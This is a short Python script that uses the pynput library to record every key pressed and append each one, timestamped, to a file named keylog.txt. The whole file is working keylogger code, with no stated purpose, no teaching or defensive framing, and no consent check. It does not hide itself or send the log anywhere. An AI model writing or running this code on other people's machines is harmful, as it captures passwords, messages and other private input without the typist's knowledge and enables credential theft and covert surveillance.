from pynput.keyboard import Key, Listener
import logging

#log file
log_dir = ''
logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener: 
    listener.join()